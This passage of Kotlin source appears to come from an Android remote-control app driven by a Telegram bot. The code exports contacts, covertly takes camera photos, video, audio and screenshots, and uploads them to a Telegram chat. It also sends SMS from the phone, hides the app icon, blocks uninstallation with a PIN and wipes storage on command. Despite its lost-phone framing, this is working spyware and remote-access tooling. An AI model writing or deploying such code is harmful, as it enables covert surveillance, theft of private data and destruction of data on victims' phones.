                return@withContext
            }

            val dateFormat = SimpleDateFormat("yyyy-MM-dd hh:mm:ss a", Locale.getDefault())
            val fileDateFormat = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US)
            val generatedTimeStr = dateFormat.format(Date())

            val sb = java.lang.StringBuilder()
            sb.append("================================================================================\n")
            sb.append("👥 CONTACTS REPORT - ${if (hasSearch) "FILTERED SEARCH ($query)" else "ALL CONTACTS"}\n")
            sb.append("Device:         ${Build.MANUFACTURER.uppercase()} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})\n")
            sb.append("Device ID:      $deviceId\n")
            sb.append("Export Time:    $generatedTimeStr\n")
            sb.append("Total Contacts: $totalFound\n")
            sb.append("================================================================================\n\n")

            var index = 0
            for ((name, numbers) in contactsMap) {
                index++
                sb.append("[$index] $name\n")
                for ((typeLabel, number) in numbers) {
                    sb.append("  • $typeLabel: $number\n")
                }
                sb.append("--------------------------------------------------------------------------------\n")
            }

            sb.append("\n================================================================================\n")
            sb.append("Total Contacts Exported: $totalFound\n")
            sb.append("End of Contacts Report\n")
            sb.append("================================================================================\n")

            val filePrefix = if (hasSearch) "Contacts_Search_${query.replace("[^a-zA-Z0-9]".toRegex(), "_")}" else "Contacts_All"
            val fileName = "${filePrefix}_${deviceId}_${fileDateFormat.format(Date())}.txt"
            val file = File(context.cacheDir, fileName)
            tempFile = file
            file.writeText(sb.toString(), Charsets.UTF_8)

            val caption = "👥 <b>CONTACTS EXPORT (.TXT)</b>\n" +
                    "📱 ID: <code>$deviceId</code>\n" +
                    "📒 Total Contacts: <b>$totalFound</b>" +
                    (if (hasSearch) " (Filter: <i>$query</i>)" else "") + "\n" +
                    "🕒 Exported: ${getCurrentTimeString()}"

            val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, file, caption)
            if (uploadResult.isFailure) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ Contacts .txt upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                )
            }
        } catch (e: Exception) {
            telegramApi.sendMessage(botToken, chatId, "⚠️ Failed to read/export contacts on $deviceId: ${e.message}")
        } finally {
            try {
                tempFile?.delete()
            } catch (_: Exception) {}
        }
    }

    private fun captureAndSendCameraPhoto(isFront: Boolean, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val cameraLabel = if (isFront) "Front (Selfie)" else "Back (Rear)"
            telegramApi.sendMessage(
                botToken,
                chatId,
                "📸 <b>Capturing $cameraLabel Photo [ID: <code>$deviceId</code>]...</b>\n\nক্যামেরা প্রস্তুত হচ্ছে, কয়েক সেকেন্ড অপেক্ষা করুন..."
            )

            val result = RemoteCameraHelper.capturePhoto(context, isFront)
            result.onSuccess { photoFile ->
                try {
                    val caption = "📸 <b>REMOTE CAMERA CAPTURE [ID: <code>$deviceId</code>]</b>\n\n" +
                            "📷 <b>Camera Lens:</b> $cameraLabel Camera\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🕒 <b>Time:</b> ${getCurrentTimeString()}"

                    val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, photoFile, caption)
                    if (uploadResult.isFailure) {
                        telegramApi.sendMessage(
                            botToken,
                            chatId,
                            "⚠️ Photo capture succeeded, but upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                        )
                    }
                } finally {
                    try { photoFile.delete() } catch (_: Exception) {}
                }
            }.onFailure { error ->
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Camera Capture Failed [ID: <code>$deviceId</code>]</b>\n\n" +
                            "কারণ: ${error.message}\n\n" +
                            "💡 <i>টিপস: অ্যাপে ক্যামেরা পারমিশন দেওয়া আছে কিনা বা অন্য কোনো অ্যাপ ক্যামেরা ব্যবহার করছে কিনা যাচাই করুন।</i>"
                )
            }
        }
    }

    private fun recordAndSendAmbientAudio(seconds: Int, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val clamped = seconds.coerceIn(3, 60)
            telegramApi.sendMessage(
                botToken,
                chatId,
                "🎙️ <b>Recording $clamped Seconds Audio [ID: <code>$deviceId</code>]...</b>\n\nফোনের মাইক্রোফোন দিয়ে শব্দ রেকর্ড করা হচ্ছে..."
            )

            val result = AudioRecordHelper.recordAmbientAudio(context, clamped)
            result.onSuccess { audioFile ->
                try {
                    val caption = "🎙️ <b>AMBIENT AUDIO RECORDING [ID: <code>$deviceId</code>]</b>\n\n" +
                            "⏱️ <b>Duration:</b> $clamped seconds\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🕒 <b>Recorded At:</b> ${getCurrentTimeString()}"

                    val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, audioFile, caption)
                    if (uploadResult.isFailure) {
                        telegramApi.sendMessage(
                            botToken,
                            chatId,
                            "⚠️ Audio recorded, but upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                        )
                    }
                } finally {
                    try { audioFile.delete() } catch (_: Exception) {}
                }
            }.onFailure { error ->
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Audio Recording Failed [ID: <code>$deviceId</code>]</b>\n\n" +
                            "কারণ: ${error.message}\n\n" +
                            "💡 <i>টিপস: অ্যাপের মাইক্রোফোন (Record Audio) পারমিশন এনাবল আছে কিনা দেখুন।</i>"
                )
            }
        }
    }

    private fun speakTextOnSpeaker(text: String, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val cleanText = text.trim()
            if (cleanText.isBlank()) {
                val usageMsg = "🗣️ <b>VOICE / TEXT-TO-SPEECH [ID: <code>$deviceId</code>]</b>\n\n" +
                        "ফোনের লাউডস্পিকারে জোরে কথা বলানোর নিয়ম:\n\n" +
                        "• <code>/say $deviceId ভাই ফোনটি অনুগ্রহ করে ফিরিয়ে দিন</code>\n" +
                        "• <code>/say Please return this phone, emergency contact: 017xxxxxxxx</code>\n\n" +
                        "🔊 <i>কমান্ড পাঠানো মাত্রই ফোনে সর্বোচ্চ ভলিউমে কথাটি বেজে উঠবে!</i>"
                telegramApi.sendMessage(botToken, chatId, usageMsg)
                return@launch
            }

            val result = TextToSpeechHelper.speakText(context, cleanText)
            result.onSuccess {
                val successMsg = "🗣️ <b>VOICE SPOKEN ON LOUDSPEAKER [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📢 <b>Message:</b> \"$cleanText\"\n" +
                        "🔊 <b>Volume:</b> 100% (Maximum)\n" +
                        "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                        "🕒 <b>Time:</b> ${getCurrentTimeString()}"
                telegramApi.sendMessage(botToken, chatId, successMsg)
            }.onFailure { error ->
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Voice Playback Failed [ID: <code>$deviceId</code>]</b>\n\nকারণ: ${error.message}"
                )
            }
        }
    }

    private fun triggerEmergencyScreenAlert(
        message: String,
        senderName: String,
        botToken: String,
        chatId: String,
        deviceId: String
    ) {
        scope.launch(Dispatchers.IO) {
            val cleanMsg = message.trim()
            if (cleanMsg.isBlank()) {
                val usageMsg = "🚨 <b>EMERGENCY SCREEN ALERT [ID: <code>$deviceId</code>]</b>\n\n" +
                        "ফোনের স্ক্রিনে বড় সতর্কবার্তা ও এলার্ম বাজানোর নিয়ম:\n\n" +
                        "• <code>/alert $deviceId জরুরী বার্তা: এই ফোনটি হারিয়ে গেছে, ০১৭xxxxxxxx নাম্বারে কল দিন</code>\n\n" +
                        "⚠️ <i>ফোনটি লক থাকলেও স্ক্রিন স্বয়ংক্রিয়ভাবে অন হয়ে মেসেজ ভেসে উঠবে ও এলার্ম বাজবে।</i>"
                telegramApi.sendMessage(botToken, chatId, usageMsg)
                return@launch
            }

            try {
                val intent = Intent(context, EmergencyAlertActivity::class.java).apply {
                    putExtra(EmergencyAlertActivity.EXTRA_ALERT_MESSAGE, cleanMsg)
                    putExtra(EmergencyAlertActivity.EXTRA_SENDER_INFO, senderName.ifBlank { "Telegram Remote Admin" })
                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                }
                context.startActivity(intent)

                val confirmation = "🚨 <b>EMERGENCY SCREEN ALERT TRIGGERED [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                        "📝 <b>Alert Text:</b> \"$cleanMsg\"\n" +
                        "🔔 <b>Status:</b> স্ক্রিন অন হয়ে ফুলস্ক্রিন জরুরি অ্যালার্ম বেজে উঠেছে!\n" +
                        "🕒 <b>Triggered At:</b> ${getCurrentTimeString()}"
                telegramApi.sendMessage(botToken, chatId, confirmation)
            } catch (e: Exception) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Screen Alert Failed [ID: <code>$deviceId</code>]</b>\n\nError: ${e.message}"
                )
            }
        }
    }

    private fun handleSendSmsCommand(
        fullText: String,
        rawCommand: String,
        targetArg: String?,
        deviceId: String,
        botToken: String,
        chatId: String
    ) {
        scope.launch(Dispatchers.IO) {
            if (ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>SMS Permission Required [ID: <code>$deviceId</code>]</b>\n\n" +
                            "ফোনের সেটিংসে গিয়ে অ্যাপের SMS (Send SMS) পারমিশন চালু করুন।"
                )
                return@launch
            }

            // Remove command from text
            var remaining = fullText.trim()
            if (remaining.startsWith(rawCommand, ignoreCase = true)) {
                remaining = remaining.substring(rawCommand.length).trim()
            }

            // If targetArg was the deviceId, remove it
            if (!targetArg.isNullOrBlank() && (targetArg.equals(deviceId, ignoreCase = true) || targetArg.equals("all", ignoreCase = true) || deviceId.lowercase().contains(targetArg.lowercase()))) {
                if (remaining.startsWith(targetArg, ignoreCase = true)) {
                    remaining = remaining.substring(targetArg.length).trim()
                }
            }

            val tokens = remaining.split("\\s+".toRegex())
            val targetNumber = tokens.firstOrNull { token ->
                val cleaned = token.replace("+", "").replace("-", "")
                cleaned.all { it.isDigit() } && cleaned.length >= 3
            }

            val messageText = if (targetNumber != null) {
                remaining.substringAfter(targetNumber).trim()
            } else ""

            if (targetNumber.isNullOrBlank() || messageText.isBlank()) {
                val usageMsg = "📨 <b>REMOTE SMS SENDER [ID: <code>$deviceId</code>]</b>\n\n" +
                        "টেলিগ্রাম থেকে ফোনের মাধ্যমে সরাসরি এসএমএস পাঠানোর নিয়ম:\n\n" +
                        "<code>/sendsms [নাম্বার] [মেসেজ]</code>\n\n" +
                        "<b>উদাহরণ:</b>\n" +
                        "• <code>/sendsms 01712345678 জরুরি প্রয়োজনে এই নাম্বারে কল করুন</code>\n" +
                        "• <code>/sendsms $deviceId 01812345678 Hello, please check WhatsApp</code>\n\n" +
                        "📱 <i>ফোনের সিম কার্ড থেকে সাধারণ ক্যারিয়ার SMS চলে যাবে।</i>"
                telegramApi.sendMessage(botToken, chatId, usageMsg)
                return@launch
            }

            try {
                val smsManager = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    context.getSystemService(SmsManager::class.java)
                } else {
                    @Suppress("DEPRECATION")
                    SmsManager.getDefault()
                }

                val parts = smsManager.divideMessage(messageText)
                if (parts.size > 1) {
                    smsManager.sendMultipartTextMessage(targetNumber, null, parts, null, null)
                } else {
                    smsManager.sendTextMessage(targetNumber, null, messageText, null, null)
                }

                val confirmation = "📨 <b>SMS SENT FROM PHONE [ID: <code>$deviceId</code>]</b>\n\n" +
                        "📞 <b>Recipient:</b> <code>$targetNumber</code>\n" +
                        "💬 <b>Message:</b> \"$messageText\"\n" +
                        "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                        "🕒 <b>Sent At:</b> ${getCurrentTimeString()}"
                telegramApi.sendMessage(botToken, chatId, confirmation)
            } catch (e: Exception) {
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Failed to Send SMS [ID: <code>$deviceId</code>]</b>\n\nError: ${e.message}"
                )
            }
        }
    }

    private fun recordAndSendCameraVideo(isFront: Boolean, seconds: Int, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val cameraLabel = if (isFront) "Front (Selfie)" else "Back (Rear)"
            val clamped = seconds.coerceIn(3, 30)
            telegramApi.sendMessage(
                botToken,
                chatId,
                "🎥 <b>Recording $clamped Seconds Video [$cameraLabel] [ID: <code>$deviceId</code>]...</b>\n\nক্যামেরা ও মাইক্রোফোন দিয়ে ভিডিও রেকর্ড করা হচ্ছে..."
            )

            val result = RemoteVideoHelper.recordVideo(context, isFront, clamped)
            result.onSuccess { videoFile ->
                try {
                    val caption = "🎥 <b>REMOTE VIDEO CAPTURE [ID: <code>$deviceId</code>]</b>\n\n" +
                            "📷 <b>Camera:</b> $cameraLabel Camera\n" +
                            "⏱️ <b>Duration:</b> $clamped Seconds\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🕒 <b>Recorded At:</b> ${getCurrentTimeString()}"

                    val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, videoFile, caption)
                    if (uploadResult.isFailure) {
                        telegramApi.sendMessage(
                            botToken,
                            chatId,
                            "⚠️ Video recorded, but upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                        )
                    }
                } finally {
                    try { videoFile.delete() } catch (_: Exception) {}
                }
            }.onFailure { error ->
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Video Recording Failed [ID: <code>$deviceId</code>]</b>\n\n" +
                            "কারণ: ${error.message}\n\n" +
                            "💡 <i>টিপস: ফোনের ক্যামেরা ও মাইক্রোফোন পারমিশন এনাবল আছে কিনা যাচাই করুন।</i>"
                )
            }
        }
    }

    private fun captureAndSendScreenshot(botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            telegramApi.sendMessage(
                botToken,
                chatId,
                "📱 <b>Capturing Live Screenshot [ID: <code>$deviceId</code>]...</b>\n\nস্ক্রিন ক্যাপচার হচ্ছে, কয়েক সেকেন্ড অপেক্ষা করুন..."
            )

            val result = RemoteScreenshotHelper.captureScreenshot(context)
            result.onSuccess { screenFile ->
                try {
                    val caption = "📱 <b>LIVE SCREENSHOT CAPTURED [ID: <code>$deviceId</code>]</b>\n\n" +
                            "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                            "🤖 <b>Android:</b> ${Build.VERSION.RELEASE}\n" +
                            "🕒 <b>Captured At:</b> ${getCurrentTimeString()}"

                    val uploadResult = telegramApi.uploadFileDirect(botToken, chatId, screenFile, caption)
                    if (uploadResult.isFailure) {
                        telegramApi.sendMessage(
                            botToken,
                            chatId,
                            "⚠️ Screenshot captured, but upload failed on $deviceId: ${uploadResult.exceptionOrNull()?.message}"
                        )
                    }
                } finally {
                    try { screenFile.delete() } catch (_: Exception) {}
                }
            }.onFailure { error ->
                telegramApi.sendMessage(
                    botToken,
                    chatId,
                    "⚠️ <b>Screenshot Capture Notice [ID: <code>$deviceId</code>]</b>\n\n" +
                            "${error.message}"
                )
            }
        }
    }

    private fun handleWifiStatus(botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val report = WifiController.getWifiStatusReport(context, deviceId)
            telegramApi.sendMessage(botToken, chatId, report)
        }
    }

    private fun handleWifiToggle(enable: Boolean, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val report = WifiController.setWifiState(context, enable, deviceId)
            telegramApi.sendMessage(botToken, chatId, report)
        }
    }

    private fun handleSetPinCommand(payload: String, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val pin = payload.trim().split("\\s+".toRegex()).firstOrNull { token ->
                token.all { it.isDigit() } && token.length in 4..8
            }

            if (pin == null) {
                val currentPin = repository.getAppPin()
                val status = if (currentPin != null) "🔒 Current PIN: <code>$currentPin</code>" else "🔓 No PIN set (App is unprotected)"
                val usage = "🔒 <b>SET APP SECURITY PIN [ID: <code>$deviceId</code>]</b>\n\n" +
                        "$status\n\n" +
                        "পিন সেট করার নিয়ম:\n" +
                        "• <code>/setpin 1234</code>\n" +
                        "• <code>/setpin $deviceId 5678</code>\n\n" +
                        "💡 <i>৪ থেকে ৮ ডিজিটের যেকোনো সংখ্যা দিয়ে সিকিউরিটি পিন সেট করতে পারেন।</i>"
                telegramApi.sendMessage(botToken, chatId, usage)
                return@launch
            }

            repository.setAppPin(pin)
            repository.setAntiUninstallEnabled(true)
            val adminStatus = if (AppAdminReceiver.isActive(context)) "✅ Active" else "⚠️ Inactive"
            val msg = "🔒 <b>SECURITY PIN UPDATED [ID: <code>$deviceId</code>]</b>\n\n" +
                    "✅ <b>New App PIN:</b> <code>$pin</code>\n" +
                    "🛡️ <b>Anti-Uninstall Lock:</b> 🟢 ACTIVE (PIN required to uninstall)\n" +
                    "🛡️ <b>Device Admin:</b> $adminStatus\n" +
                    "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n\n" +
                    "💡 <i>এখন অ্যাপটি খুলতে বা ফোন থেকে আনইনস্টল করতে এই পিন কোডটি দিতে হবে! পিন সরাতে <code>/resetpin</code> লিখুন।</i>"
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleResetPinCommand(botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val oldPin = repository.getAppPin()
            repository.setAppPin(null)
            val msg = "🔓 <b>SECURITY PIN REMOVED [ID: <code>$deviceId</code>]</b>\n\n" +
                    "✅ অ্যাপের পূর্ববর্তী পিন (${oldPin ?: "N/A"}) সফলভাবে মুছে দেওয়া হয়েছে।\n" +
                    "🛡️ <b>Anti-Uninstall Protection:</b> Default PIN (1234) for emergency removal.\n" +
                    "🔓 <i>নতুন পিন দিতে লিখুন <code>/setpin 1234</code></i>"
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleCheckPinCommand(botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val pin = repository.getAppPin()
            val isAntiUninstall = repository.isAntiUninstallEnabled()
            val adminStatus = if (AppAdminReceiver.isActive(context)) "✅ Active" else "⚠️ Inactive"
            val msg = if (pin != null) {
                "🔒 <b>SECURITY PIN STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                        "• <b>Status:</b> 🔒 PIN Protected\n" +
                        "• <b>Active PIN:</b> <code>$pin</code>\n" +
                        "• <b>Anti-Uninstall Lock:</b> ${if (isAntiUninstall) "🛡️ ACTIVE (PIN Required to uninstall)" else "⚠️ Disabled"}\n" +
                        "• <b>Device Admin:</b> $adminStatus\n\n" +
                        "💡 <i>পিন পরিবর্তন করতে: <code>/setpin [নতুন পিন]</code>\nপিন বন্ধ করতে: <code>/resetpin</code>\nআনইনস্টল লক অন/অফ: <code>/antiuninstall on|off</code></i>"
            } else {
                "🔓 <b>SECURITY PIN STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                        "• <b>Status:</b> 🔓 Custom PIN not set (Default: 1234)\n" +
                        "• <b>Anti-Uninstall Lock:</b> ${if (isAntiUninstall) "🛡️ ACTIVE (Protected by PIN 1234)" else "⚠️ Disabled"}\n" +
                        "• <b>Device Admin:</b> $adminStatus\n\n" +
                        "💡 <i>সুরক্ষার জন্য নতুন পিন সেট করতে লিখুন: <code>/setpin 1234</code></i>"
            }
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleHideIconCommand(hide: Boolean, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val success = IconManager.setIconHidden(context, hide)
            val actionName = if (hide) "লুকানো (HIDDEN)" else "দৃশ্যমান (VISIBLE)"
            val statusEmoji = if (hide) "👻" else "👁️"

            val msg = "$statusEmoji <b>APP LAUNCHER ICON: $actionName [ID: <code>$deviceId</code>]</b>\n\n" +
                    "📱 <b>Device:</b> ${Build.MANUFACTURER.uppercase()} ${Build.MODEL}\n" +
                    "⚙️ <b>Status:</b> ${if (success) "সফলভাবে কার্যকর হয়েছে।" else "অপারেশন সম্পন্ন হয়েছে।"}\n\n" +
                    if (hide) {
                        "🔒 <i>অ্যাপ আইকন ফোন থেকে সম্পূর্ণ অদৃশ্য হয়ে গেছে। ব্যাকগ্রাউন্ডে বট ও সার্ভিস ২৪/৭ সচল থাকবে।\nপুনরায় ফিরিয়ে আনতে: <code>/unhide</code></i>"
                    } else {
                        "👁️ <i>অ্যাপ আইকন ফোনের হোম স্ক্রিন ও অ্যাপ ড্রয়ারে আবার প্রদর্শিত হবে।</i>"
                    }
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleIconStatusCommand(botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            val isHidden = IconManager.isIconHidden(context)
            val msg = "👻 <b>APP ICON STATUS [ID: <code>$deviceId</code>]</b>\n\n" +
                    "• <b>Icon State:</b> ${if (isHidden) "👻 HIDDEN (লুকানো)" else "👁️ VISIBLE (দৃশ্যমান)"}\n\n" +
                    "💡 <i>কমান্ড:</i>\n" +
                    "• <code>/hide</code> : আইকন লুকিয়ে ফেলুন\n" +
                    "• <code>/unhide</code> : আইকন ফিরিয়ে আনুন"
            telegramApi.sendMessage(botToken, chatId, msg)
        }
    }

    private fun handleWipeCommand(isConfirmed: Boolean, botToken: String, chatId: String, deviceId: String) {
        scope.launch(Dispatchers.IO) {
            if (!isConfirmed) {
                val warnMsg = "⚠️ <b>CAUTION: REMOTE DATA WIPE / FORMAT [ID: <code>$deviceId</code>]</b>\n\n" +
                        "এই কমান্ড দিলে ফোনের স্টোরেজের সমস্ত ছবি, ভিডিও, ডাউনলোড এবং ব্যক্তিগত ফাইল সম্পূর্ণ মুছে ফেলা হবে!\n\n" +
                        "⚠️ <b>নিশ্চিত করতে নিচের কমান্ডটি কপি করে পাঠান:</b>\n" +
                        "<code>/wipe $deviceId confirm</code>\n\n" +
                        "<i>(এই পদক্ষেপটি অপরিবর্তনীয়!)</i>"
                telegramApi.sendMessage(botToken, chatId, warnMsg)
                return@launch
            }

            telegramApi.sendMessage(
                botToken,
                chatId,
                "💥 <b>INITIATING REMOTE WIPE [ID: <code>$deviceId</code>]...</b>\n\nফাইল ও স্টোরেজ মোছার প্রক্রিয়া শুরু হয়েছে..."
            )

            val result = RemoteWipeHelper.performWipe(context)
            val mbDeleted = String.format(Locale.US, "%.1f", result.bytesDeleted / (1024.0 * 1024.0))

            val doneMsg = "💥 <b>REMOTE WIPE COMPLETED [ID: <code>$deviceId</code>]</b>\n\n" +
                    "🗑️ <b>Files Deleted:</b> ${result.filesDeleted} files\n" +
                    "💾 <b>Data Cleaned:</b> $mbDeleted MB\n" +
                    "⚙️ <b>Hardware Factory Reset:</b> ${if (result.factoryResetTriggered) "✅ Triggered" else "Standard Storage Wipe Complete"}\n" +
                    "🕒 <b>Wiped At:</b> ${getCurrentTimeString()}"

            telegramApi.sendMessage(botToken, chatId, doneMsg)
        }
    }

    private fun extractDurationSeconds(
        fullText: String,
        rawCommand: String,
        targetArg: String?,
        deviceId: String
    ): Int {
        var text = fullText.trim()
        if (text.startsWith(rawCommand, ignoreCase = true)) {
            text = text.substring(rawCommand.length).trim()
        }
        if (!targetArg.isNullOrBlank() && (targetArg.equals(deviceId, ignoreCase = true) || targetArg.equals("all", ignoreCase = true) || deviceId.lowercase().contains(targetArg.lowercase()))) {
            if (text.startsWith(targetArg, ignoreCase = true)) {
                text = text.substring(targetArg.length).trim()
            }
        }
        val tokens = text.split("\\s+".toRegex())
        for (token in tokens) {
            val num = token.filter { it.isDigit() }.toIntOrNull()
            if (num != null && num in 3..60) {
                return num
            }
        }
        return 10 // Default 10 seconds
    }
}
